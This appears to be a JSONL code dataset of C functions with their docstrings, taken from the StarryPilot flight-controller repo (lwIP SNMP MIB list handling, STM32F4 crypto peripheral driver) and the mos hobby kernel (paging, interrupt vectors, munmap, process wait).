{"docstring": "/**\n * Inserts node in idx list in a sorted\n * (ascending order) fashion and\n * allocates the node if needed.\n *\n * @param rn points to the root node\n * @param objid is the object sub identifier\n * @param insn points to a pointer to the inserted node\n *   used for constructing the tree.\n * @return -1 if failed, 1 if inserted, 2 if present.\n */\n", "func_signal": "s8_t\nsnmp_mib_node_insert(struct mib_list_rootnode *rn, s32_t objid, struct mib_list_node **insn)", "code": "{\n  struct mib_list_node *nn;\n  s8_t insert;\n\n  LWIP_ASSERT(\"rn != NULL\",rn != NULL);\n\n  /* -1 = malloc failure, 0 = not inserted, 1 = inserted, 2 = was present */\n  insert = 0;\n  if (rn->head == NULL)\n  {\n    /* empty list, add first node */\n    LWIP_DEBUGF(SNMP_MIB_DEBUG,(\"alloc empty list objid==%\"S32_F\"\\n\",objid));\n    nn = snmp_mib_ln_alloc(objid);\n    if (nn != NULL)\n    {\n      rn->head = nn;\n      rn->tail = nn;\n      *insn = nn;\n      insert = 1;\n    }\n    else\n    {\n      insert = -1;\n    }\n  }\n  else\n  {\n    struct mib_list_node *n;\n    /* at least one node is present */\n    n = rn->head;\n    while ((n != NULL) && (insert == 0))\n    {\n      if (n->objid == objid)\n      {\n        /* node is already there */\n        LWIP_DEBUGF(SNMP_MIB_DEBUG,(\"node already there objid==%\"S32_F\"\\n\",objid));\n        *insn = n;\n        insert = 2;\n      }\n      else if (n->objid < objid)\n      {\n        if (n->next == NULL)\n        {\n          /* alloc and insert at the tail */\n          LWIP_DEBUGF(SNMP_MIB_DEBUG,(\"alloc ins tail objid==%\"S32_F\"\\n\",objid));\n          nn = snmp_mib_ln_alloc(objid);\n          if (nn != NULL)\n          {\n            nn->next = NULL;\n            nn->prev = n;\n            n->next = nn;\n            rn->tail = nn;\n            *insn = nn;\n            insert = 1;\n          }\n          else\n          {\n            /* insertion failure */\n            insert = -1;\n          }\n        }\n        else\n        {\n          /* there's more to explore: traverse list */\n          LWIP_DEBUGF(SNMP_MIB_DEBUG,(\"traverse list\\n\"));\n          n = n->next;\n        }\n      }\n      else\n      {\n        /* n->objid > objid */\n        /* alloc and insert between n->prev and n */\n        LWIP_DEBUGF(SNMP_MIB_DEBUG,(\"alloc ins n->prev, objid==%\"S32_F\", n\\n\",objid));\n        nn = snmp_mib_ln_alloc(objid);\n        if (nn != NULL)\n        {\n          if (n->prev == NULL)\n          {\n            /* insert at the head */\n            nn->next = n;\n            nn->prev = NULL;\n            rn->head = nn;\n            n->prev = nn;\n          }\n          else\n          {\n            /* insert in the middle */\n            nn->next = n;\n            nn->prev = n->prev;\n            n->prev->next = nn;\n            n->prev = nn;\n          }\n          *insn = nn;\n          insert = 1;\n        }\n        else\n        {\n          /* insertion failure */\n          insert = -1;\n        }\n      }\n    }\n  }\n  if (insert == 1)\n  {\n    rn->count += 1;\n  }\n  LWIP_ASSERT(\"insert != 0\",insert != 0);\n  return insert;\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n * Conversion from ifIndex to lwIP netif\n * @param ifindex is a s32_t object sub-identifier\n * @param netif points to returned netif struct pointer\n */\n", "func_signal": "void\nsnmp_ifindextonetif(s32_t ifindex, struct netif **netif)", "code": "{\n  struct netif *nif = netif_list;\n  u16_t i, ifidx;\n\n  ifidx = ifindex - 1;\n  i = 0;\n  while ((nif != NULL) && (i < ifidx))\n  {\n    nif = nif->next;\n    i++;\n  }\n  *netif = nif;\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n  * @brief  Checks whether the specified CRYP interrupt has occurred or not.\n  * @note   This function checks the status of the masked interrupt (i.e the \n  *         interrupt should be previously enabled).     \n  * @param  CRYP_IT: specifies the CRYP (masked) interrupt source to check.\n  *           This parameter can be one of the following values:\n  *            @arg CRYP_IT_INI: Input FIFO interrupt\n  *            @arg CRYP_IT_OUTI: Output FIFO interrupt\n  * @retval The new state of CRYP_IT (SET or RESET).\n  */\n", "func_signal": "ITStatus CRYP_GetITStatus(uint8_t CRYP_IT)", "code": "{\n  ITStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_CRYP_GET_IT(CRYP_IT));\n\n  /* Check the status of the specified CRYP interrupt */\n  if ((CRYP->MISR &  CRYP_IT) != (uint8_t)RESET)\n  {\n    /* CRYP_IT is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* CRYP_IT is reset */\n    bitstatus = RESET;\n  }\n  /* Return the CRYP_IT status */\n  return bitstatus;\n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n  * @brief  Enables or disables the CRYP peripheral.\n  * @param  NewState: new state of the CRYP peripheral.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void CRYP_Cmd(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    /* Enable the Cryptographic processor */\n    CRYP->CR |= CRYP_CR_CRYPEN;\n  }\n  else\n  {\n    /* Disable the Cryptographic processor */\n    CRYP->CR &= ~CRYP_CR_CRYPEN;\n  }\n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n * Test object identifier for the iso.org.dod.internet prefix.\n *\n * @param ident_len the length of the supplied object identifier\n * @param ident points to the array of sub identifiers\n * @return 1 if it matches, 0 otherwise\n */\n", "func_signal": "u8_t\nsnmp_iso_prefix_tst(u8_t ident_len, s32_t *ident)", "code": "{\n  if ((ident_len > 3) &&\n      (ident[0] == 1) && (ident[1] == 3) &&\n      (ident[2] == 6) && (ident[3] == 1))\n  {\n    return 1;\n  }\n  else\n  {\n    return 0;\n  }\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n * Conversion from oid to lwIP ip_addr\n * @param ident points to s32_t ident[4] input\n * @param ip points to output struct\n */\n", "func_signal": "void\nsnmp_oidtoip(s32_t *ident, struct ip_addr *ip)", "code": "{\n  u32_t ipa;\n\n  ipa = ident[0];\n  ipa <<= 8;\n  ipa |= ident[1];\n  ipa <<= 8;\n  ipa |= ident[2];\n  ipa <<= 8;\n  ipa |= ident[3];\n  ip->addr = ipa;\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n * Conversion from lwIP netif to ifIndex\n * @param netif points to a netif struct\n * @param ifidx points to s32_t object sub-identifier\n */\n", "func_signal": "void\nsnmp_netiftoifindex(struct netif *netif, s32_t *ifidx)", "code": "{\n  struct netif *nif = netif_list;\n  u16_t i;\n\n  i = 0;\n  while ((nif != NULL) && (nif != netif))\n  {\n    nif = nif->next;\n    i++;\n  }\n  *ifidx = i+1;\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n  * @brief  Configures the AES-CCM and AES-GCM phases\n  * @note   This function is used only with AES-CCM or AES-GCM Algorithms  \n  * @param  CRYP_Phase: specifies the CRYP AES-CCM and AES-GCM phase to be configured.\n  *           This parameter can be one of the following values:\n  *            @arg CRYP_Phase_Init: Initialization phase\n  *            @arg CRYP_Phase_Header: Header phase\n  *            @arg CRYP_Phase_Payload: Payload phase\n  *            @arg CRYP_Phase_Final: Final phase \n  * @retval None\n  */\n", "func_signal": "void CRYP_PhaseConfig(uint32_t CRYP_Phase)", "code": "{ uint32_t tempcr = 0;\n\n  /* Check the parameter */\n  assert_param(IS_CRYP_PHASE(CRYP_Phase));\n\n  /* Get the CR register */\n  tempcr = CRYP->CR;\n  \n  /* Reset the phase configuration bits: GCMP_CCMPH */\n  tempcr &= (uint32_t)(~CRYP_CR_GCM_CCMPH);\n  /* Set the selected phase */\n  tempcr |= (uint32_t)CRYP_Phase;\n\n  /* Set the CR register */ \n  CRYP->CR = tempcr;    \n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n * Expands object identifier to the iso.org.dod.internet\n * prefix for use in getnext operation.\n *\n * @param ident_len the length of the supplied object identifier\n * @param ident points to the array of sub identifiers\n * @param oidret points to returned expanded object identifier\n * @return 1 if it matches, 0 otherwise\n *\n * @note ident_len 0 is allowed, expanding to the first known object id!!\n */\n", "func_signal": "u8_t\nsnmp_iso_prefix_expand(u8_t ident_len, s32_t *ident, struct snmp_obj_id *oidret)", "code": "{\n  const s32_t *prefix_ptr;\n  s32_t *ret_ptr;\n  u8_t i;\n\n  i = 0;\n  prefix_ptr = &prefix[0];\n  ret_ptr = &oidret->id[0];\n  ident_len = ((ident_len < 4)?ident_len:4);\n  while ((i < ident_len) && ((*ident) <= (*prefix_ptr)))\n  {\n    *ret_ptr++ = *prefix_ptr++;\n    ident++;\n    i++;\n  }\n  if (i == ident_len)\n  {\n    /* match, complete missing bits */\n    while (i < 4)\n    {\n      *ret_ptr++ = *prefix_ptr++;\n      i++;\n    }\n    oidret->len = i;\n    return 1;\n  }\n  else\n  {\n    /* i != ident_len */\n    return 0;\n  }\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n  * @brief  Initializes the CRYP Initialization Vectors(IV) according to the\n  *         specified parameters in the CRYP_IVInitStruct.\n  * @param  CRYP_IVInitStruct: pointer to a CRYP_IVInitTypeDef structure that contains\n  *         the configuration information for the CRYP Initialization Vectors(IV).\n  * @retval None\n  */\n", "func_signal": "void CRYP_IVInit(CRYP_IVInitTypeDef* CRYP_IVInitStruct)", "code": "{\n  CRYP->IV0LR = CRYP_IVInitStruct->CRYP_IV0Left;\n  CRYP->IV0RR = CRYP_IVInitStruct->CRYP_IV0Right;\n  CRYP->IV1LR = CRYP_IVInitStruct->CRYP_IV1Left;\n  CRYP->IV1RR = CRYP_IVInitStruct->CRYP_IV1Right;\n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n  * @brief  Restores the CRYP peripheral Context.\n  * @note   Since teh DMA transfer is stopped in CRYP_SaveContext() function,\n  *         after restoring the context, you have to enable the DMA again (if the\n  *         DMA was previously used).  \n  * @param  CRYP_ContextRestore: pointer to a CRYP_Context structure that contains\n  *         the repository for saved context.\n  * @note   The data that were saved during context saving must be rewrited into\n  *         the IN FIFO.\n  * @retval None\n  */\n", "func_signal": "void CRYP_RestoreContext(CRYP_Context* CRYP_ContextRestore)", "code": "{\n\n  /* Configure the processor with the saved configuration */\n  CRYP->CR = CRYP_ContextRestore->CR_CurrentConfig;\n\n  /* restore The key value */\n  CRYP->K0LR = CRYP_ContextRestore->CRYP_K0LR; \n  CRYP->K0RR = CRYP_ContextRestore->CRYP_K0RR;\n  CRYP->K1LR = CRYP_ContextRestore->CRYP_K1LR;\n  CRYP->K1RR = CRYP_ContextRestore->CRYP_K1RR;\n  CRYP->K2LR = CRYP_ContextRestore->CRYP_K2LR;\n  CRYP->K2RR = CRYP_ContextRestore->CRYP_K2RR;\n  CRYP->K3LR = CRYP_ContextRestore->CRYP_K3LR;\n  CRYP->K3RR = CRYP_ContextRestore->CRYP_K3RR;\n\n  /* and the initialization vectors. */\n  CRYP->IV0LR = CRYP_ContextRestore->CRYP_IV0LR;\n  CRYP->IV0RR = CRYP_ContextRestore->CRYP_IV0RR;\n  CRYP->IV1LR = CRYP_ContextRestore->CRYP_IV1LR;\n  CRYP->IV1RR = CRYP_ContextRestore->CRYP_IV1RR;\n\n  /* Restore the content of context swap registers */\n  CRYP->CSGCMCCM0R = CRYP_ContextRestore->CRYP_CSGCMCCMR[0];\n  CRYP->CSGCMCCM1R = CRYP_ContextRestore->CRYP_CSGCMCCMR[1];\n  CRYP->CSGCMCCM2R = CRYP_ContextRestore->CRYP_CSGCMCCMR[2];\n  CRYP->CSGCMCCM3R = CRYP_ContextRestore->CRYP_CSGCMCCMR[3];\n  CRYP->CSGCMCCM4R = CRYP_ContextRestore->CRYP_CSGCMCCMR[4];\n  CRYP->CSGCMCCM5R = CRYP_ContextRestore->CRYP_CSGCMCCMR[5];\n  CRYP->CSGCMCCM6R = CRYP_ContextRestore->CRYP_CSGCMCCMR[6];\n  CRYP->CSGCMCCM7R = CRYP_ContextRestore->CRYP_CSGCMCCMR[7];\n  \n  CRYP->CSGCM0R = CRYP_ContextRestore->CRYP_CSGCMR[0];\n  CRYP->CSGCM1R = CRYP_ContextRestore->CRYP_CSGCMR[1];\n  CRYP->CSGCM2R = CRYP_ContextRestore->CRYP_CSGCMR[2];\n  CRYP->CSGCM3R = CRYP_ContextRestore->CRYP_CSGCMR[3];\n  CRYP->CSGCM4R = CRYP_ContextRestore->CRYP_CSGCMR[4];\n  CRYP->CSGCM5R = CRYP_ContextRestore->CRYP_CSGCMR[5];\n  CRYP->CSGCM6R = CRYP_ContextRestore->CRYP_CSGCMR[6];\n  CRYP->CSGCM7R = CRYP_ContextRestore->CRYP_CSGCMR[7];\n  \n  /* Enable the cryptographic processor */\n  CRYP->CR |= CRYP_CR_CRYPEN;\n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n * Test table for presence of at least one table entry.\n */\n", "func_signal": "static u8_t\nempty_table(struct mib_node *node)", "code": "{\n  u8_t node_type;\n  u8_t empty = 0;\n\n  if (node != NULL)\n  {\n    node_type = node->node_type;\n    if (node_type == MIB_NODE_LR)\n    {\n      struct mib_list_rootnode *lrn;\n      lrn = (struct mib_list_rootnode *)node;\n      if ((lrn->count == 0) || (lrn->head == NULL))\n      {\n        empty = 1;\n      }\n    }\n    else if ((node_type == MIB_NODE_AR) || (node_type == MIB_NODE_RA))\n    {\n      struct mib_array_node *an;\n      an = (struct mib_array_node *)node;\n      if ((an->maxlength == 0) || (an->nptr == NULL))\n      {\n        empty = 1;\n      }\n    }\n    else if (node_type == MIB_NODE_EX)\n    {\n      struct mib_external_node *en;\n      en = (struct mib_external_node *)node;\n      if (en->tree_levels == 0)\n      {\n        empty = 1;\n      }\n    }\n  }\n  return empty;\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n * Finds node in idx list and returns deletion mark.\n *\n * @param rn points to the root node\n * @param objid  is the object sub identifier\n * @param fn returns pointer to found node\n * @return 0 if not found, 1 if deletable,\n *   2 can't delete (2 or more children), 3 not a list_node\n */\n", "func_signal": "s8_t\nsnmp_mib_node_find(struct mib_list_rootnode *rn, s32_t objid, struct mib_list_node **fn)", "code": "{\n  s8_t fc;\n  struct mib_list_node *n;\n\n  LWIP_ASSERT(\"rn != NULL\",rn != NULL);\n  n = rn->head;\n  while ((n != NULL) && (n->objid != objid))\n  {\n    n = n->next;\n  }\n  if (n == NULL)\n  {\n    fc = 0;\n  }\n  else if (n->nptr == NULL)\n  {\n    /* leaf, can delete node */\n    fc = 1;\n  }\n  else\n  {\n    struct mib_list_rootnode *r;\n\n    if (n->nptr->node_type == MIB_NODE_LR)\n    {\n      r = (struct mib_list_rootnode *)n->nptr;\n      if (r->count > 1)\n      {\n        /* can't delete node */\n        fc = 2;\n      }\n      else\n      {\n        /* count <= 1, can delete node */\n        fc = 1;\n      }\n    }\n    else\n    {\n      /* other node type */\n      fc = 3;\n    }\n  }\n  *fn = n;\n  return fc;\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n  * @brief  Initializes the CRYP Keys according to the specified parameters in\n  *         the CRYP_KeyInitStruct.\n  * @param  CRYP_KeyInitStruct: pointer to a CRYP_KeyInitTypeDef structure that\n  *         contains the configuration information for the CRYP Keys.\n  * @retval None\n  */\n", "func_signal": "void CRYP_KeyInit(CRYP_KeyInitTypeDef* CRYP_KeyInitStruct)", "code": "{\n  /* Key Initialisation */\n  CRYP->K0LR = CRYP_KeyInitStruct->CRYP_Key0Left;\n  CRYP->K0RR = CRYP_KeyInitStruct->CRYP_Key0Right;\n  CRYP->K1LR = CRYP_KeyInitStruct->CRYP_Key1Left;\n  CRYP->K1RR = CRYP_KeyInitStruct->CRYP_Key1Right;\n  CRYP->K2LR = CRYP_KeyInitStruct->CRYP_Key2Left;\n  CRYP->K2RR = CRYP_KeyInitStruct->CRYP_Key2Right;\n  CRYP->K3LR = CRYP_KeyInitStruct->CRYP_Key3Left;\n  CRYP->K3RR = CRYP_KeyInitStruct->CRYP_Key3Right;\n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n  * @brief  Initializes the CRYP peripheral according to the specified parameters\n  *         in the CRYP_InitStruct.\n  * @param  CRYP_InitStruct: pointer to a CRYP_InitTypeDef structure that contains\n  *         the configuration information for the CRYP peripheral.\n  * @retval None\n  */\n", "func_signal": "void CRYP_Init(CRYP_InitTypeDef* CRYP_InitStruct)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_CRYP_ALGOMODE(CRYP_InitStruct->CRYP_AlgoMode));\n  assert_param(IS_CRYP_DATATYPE(CRYP_InitStruct->CRYP_DataType));\n  assert_param(IS_CRYP_ALGODIR(CRYP_InitStruct->CRYP_AlgoDir));\n\n  /* Select Algorithm mode*/  \n  CRYP->CR &= ~CRYP_CR_ALGOMODE;\n  CRYP->CR |= CRYP_InitStruct->CRYP_AlgoMode;\n\n  /* Select dataType */ \n  CRYP->CR &= ~CRYP_CR_DATATYPE;\n  CRYP->CR |= CRYP_InitStruct->CRYP_DataType;\n\n  /* select Key size (used only with AES algorithm) */\n  if ((CRYP_InitStruct->CRYP_AlgoMode != CRYP_AlgoMode_TDES_ECB) &&\n      (CRYP_InitStruct->CRYP_AlgoMode != CRYP_AlgoMode_TDES_CBC) &&\n      (CRYP_InitStruct->CRYP_AlgoMode != CRYP_AlgoMode_DES_ECB) &&\n      (CRYP_InitStruct->CRYP_AlgoMode != CRYP_AlgoMode_DES_CBC))\n  {\n    assert_param(IS_CRYP_KEYSIZE(CRYP_InitStruct->CRYP_KeySize));\n    CRYP->CR &= ~CRYP_CR_KEYSIZE;\n    CRYP->CR |= CRYP_InitStruct->CRYP_KeySize; /* Key size and value must be \n                                                  configured once the key has \n                                                  been prepared */\n  }\n\n  /* Select data Direction */ \n  CRYP->CR &= ~CRYP_CR_ALGODIR;\n  CRYP->CR |= CRYP_InitStruct->CRYP_AlgoDir;\n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n * Removes node from idx list\n * if it has a single child left.\n *\n * @param rn points to the root node\n * @param n points to the node to delete\n * @return the nptr to be freed by caller\n */\n", "func_signal": "struct mib_list_rootnode *\nsnmp_mib_node_delete(struct mib_list_rootnode *rn, struct mib_list_node *n)", "code": "{\n  struct mib_list_rootnode *next;\n\n  LWIP_ASSERT(\"rn != NULL\",rn != NULL);\n  LWIP_ASSERT(\"n != NULL\",n != NULL);\n\n  /* caller must remove this sub-tree */\n  next = (struct mib_list_rootnode*)(n->nptr);\n  rn->count -= 1;\n\n  if (n == rn->head)\n  {\n    rn->head = n->next;\n    if (n->next != NULL)\n    {\n      /* not last node, new list begin */\n      n->next->prev = NULL;\n    }\n  }\n  else if (n == rn->tail)\n  {\n    rn->tail = n->prev;\n    if (n->prev != NULL)\n    {\n      /* not last node, new list end */\n      n->prev->next = NULL;\n    }\n  }\n  else\n  {\n    /* node must be in the middle */\n    n->prev->next = n->next;\n    n->next->prev = n->prev;\n  }\n  LWIP_DEBUGF(SNMP_MIB_DEBUG,(\"free list objid==%\"S32_F\"\\n\",n->objid));\n  snmp_mib_ln_free(n);\n  if (rn->count == 0)\n  {\n    rn->head = NULL;\n    rn->tail = NULL;\n  }\n  return next;\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n * Conversion from lwIP ip_addr to oid\n * @param ip points to input struct\n * @param ident points to s32_t ident[4] output\n */\n", "func_signal": "void\nsnmp_iptooid(struct ip_addr *ip, s32_t *ident)", "code": "{\n  u32_t ipa;\n\n  ipa = ip->addr;\n  ident[0] = (ipa >> 24) & 0xff;\n  ident[1] = (ipa >> 16) & 0xff;\n  ident[2] = (ipa >> 8) & 0xff;\n  ident[3] = ipa & 0xff;\n}", "path": "starry_fmu\\RTOS\\components\\net\\lwip-1.3.2\\src\\core\\snmp\\mib_structs.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n  * @brief  Returns whether CRYP peripheral is enabled or disabled.\n  * @param  none.\n  * @retval Current state of the CRYP peripheral (ENABLE or DISABLE).\n  */\n", "func_signal": "FunctionalState CRYP_GetCmdStatus(void)", "code": "{\n  FunctionalState state = DISABLE;\n\n  if ((CRYP->CR & CRYP_CR_CRYPEN) != 0)\n  {\n    /* CRYPEN bit is set */\n    state = ENABLE;\n  }\n  else\n  {\n    /* CRYPEN bit is reset */\n    state = DISABLE;\n  }\n  return state;\n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n* Unmap page table\n* \\param dir Page directory\n* \\param virt Virtual address\n*/\n", "func_signal": "void vmmngr_unmapPageTable(pdirectory *dir, uint32_t virt)", "code": "{\n        pd_entry *pagedir = dir->m_entries;\n        if (pagedir[virt >> 22] != 0)\n        {\n\n                /* get mapped frame */\n                void *frame = (void *)(pagedir[virt >> 22] & 0x7FFFF000);\n\n                /* unmap frame */\n                pmmngr_free_block(frame);\n                pagedir[virt >> 22] = 0;\n        }\n}", "path": "examples\\mikeos\\kernel\\mmngr_virtual.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "//! sets new interrupt vector\n", "func_signal": "void setvect(int intno, I86_IRQ_HANDLER vect)", "code": "{\n\t//! install interrupt handler! This overwrites prev interrupt descriptor\n\ti86_install_ir(intno, I86_IDT_DESC_PRESENT | I86_IDT_DESC_BIT32,\n\t\t\t\t\t\t\t\t 0x8, vect);\n}", "path": "examples\\mikeos\\kernel\\Hal\\Hal.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "// NOTE: MQ 2020-01-25 We only support unmap in one area\n", "func_signal": "int do_munmap(struct mm_struct *mm, uint32_t addr, size_t len)", "code": "{\n\tstruct vm_area_struct *vma = find_vma(mm, addr);\n\tif (!vma || vma->vm_start < addr)\n\t\treturn 0;\n\n\tlen = PAGE_ALIGN(len);\n\tif (vma->vm_end - vma->vm_start >= len)\n\t\tvma->vm_end = addr;\n\telse\n\t\tlist_del(&vma->vm_sibling);\n\n\treturn 0;\n}", "path": "src\\kernel\\memory\\mmap.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "//! generate i86 interrupt request\n", "func_signal": "void geninterrupt(int n)", "code": "{\n#ifdef _MSC_VER\n\t_asm {\n\t\tmov al, byte ptr [n]\n\t\tmov byte ptr [genint+1], al\n\t\tjmp genint\n\tgenint:\n\t\tint 0 // above code modifies the 0 to int number to generate\n\t}\n#endif\n}", "path": "examples\\mikeos\\kernel\\Hal\\Hal.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "/**\n* Get physical address from virtual\n* \\param dir Page directory\n* \\param virt Virtual address\n* \\ret Physical address\n*/\n", "func_signal": "void *vmmngr_getPhysicalAddress(pdirectory *dir, uint32_t virt)", "code": "{\n        pd_entry *pagedir = dir->m_entries;\n        if (pagedir[virt >> 22] == 0)\n                return 0;\n        return (void *)((uint32_t *)(pagedir[virt >> 22] & ~0xfff))[virt << 10 >> 10 >> 12];\n}", "path": "examples\\mikeos\\kernel\\mmngr_virtual.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "/**\n* Unmap address\n* \\param dir Page directory\n* \\param virt Virtual address\n*/\n", "func_signal": "void vmmngr_unmapPhysicalAddress(pdirectory *dir, uint32_t virt)", "code": "{\n        /* note: we don't unallocate physical address here; callee does that */\n        pd_entry *pagedir = dir->m_entries;\n        if (pagedir[virt >> 22] != 0)\n                vmmngr_unmapPageTable(dir, virt);\n        //      ((uint32_t*) (pagedir[virt >> 22] & ~0xfff))[virt << 10 >> 10 >> 12] = 0;\n}", "path": "examples\\mikeos\\kernel\\mmngr_virtual.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "/*\n * Return:\n * - 1 if found a child process which status is available\n * - 0 if found at least one child process which status is unavailable and WNOHANG in options\n * - < 0 otherwise\n*/\n", "func_signal": "int32_t do_wait(idtype_t idtype, id_t id, struct infop *infop, int options)", "code": "{\n\tDEFINE_WAIT(wait);\n\tlist_add_tail(&wait.sibling, &current_process->wait_chld.list);\n\n\tlog(\"Process: Wait %s(p%d) with idtype=%d id=%d options=%d\", current_process->name, current_process->pid, idtype, id, options);\n\tstruct process *pchild = NULL;\n\tbool child_exist = false;\n\twhile (true)\n\t{\n\t\tstruct process *iter;\n\t\tlist_for_each_entry(iter, &current_process->children, sibling)\n\t\t{\n\t\t\tif (!((idtype == P_PID && iter->pid == id) ||\n\t\t\t\t  (idtype == P_PGID && iter->gid == id) ||\n\t\t\t\t  idtype == P_ALL))\n\t\t\t\tcontinue;\n\n\t\t\tchild_exist = true;\n\t\t\tif ((options & WEXITED && (iter->flags & SIGNAL_TERMINATED || iter->flags & EXIT_TERMINATED)) ||\n\t\t\t\t(options & WSTOPPED && iter->flags & SIGNAL_STOPED) ||\n\t\t\t\t(options & WCONTINUED && iter->flags & SIGNAL_CONTINUED))\n\t\t\t{\n\t\t\t\tpchild = iter;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tif (pchild || options & WNOHANG)\n\t\t\tbreak;\n\n\t\tupdate_thread(current_thread, THREAD_WAITING);\n\t\tschedule();\n\t}\n\tlist_del(&wait.sibling);\n\n\tint32_t ret = -1;\n\tif (pchild)\n\t{\n\t\tinfop->si_pid = pchild->pid;\n\t\tinfop->si_signo = SIGCHLD;\n\t\tinfop->si_status = pchild->caused_signal;\n\t\tif (pchild->flags & SIGNAL_STOPED)\n\t\t\tinfop->si_code = CLD_STOPPED;\n\t\telse if (pchild->flags & SIGNAL_CONTINUED)\n\t\t\tinfop->si_code = CLD_CONTINUED;\n\t\telse if (pchild->flags & SIGNAL_TERMINATED)\n\t\t\tinfop->si_code = sig_kernel_coredump(pchild->caused_signal) ? CLD_DUMPED : CLD_KILLED;\n\t\telse if (pchild->flags & EXIT_TERMINATED)\n\t\t{\n\t\t\tinfop->si_code = CLD_EXITED;\n\t\t\tinfop->si_status = pchild->exit_code;\n\t\t}\n\t\t// NOTE: MQ 2020-11-25\n\t\t// After waiting for terminated child, we remove it from parent\n\t\t// the next waiting time, we don't find the same one again\n\t\tlist_del(&pchild->sibling);\n\t\tret = 1;\n\t}\n\telse\n\t\tret = child_exist && options & WNOHANG ? 0 : -ECHILD;\n\n\tlog(\"Process: Wait %s(p%d) done\", current_process->name, current_process->pid);\n\treturn ret;\n}", "path": "src\\kernel\\proc\\exit.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
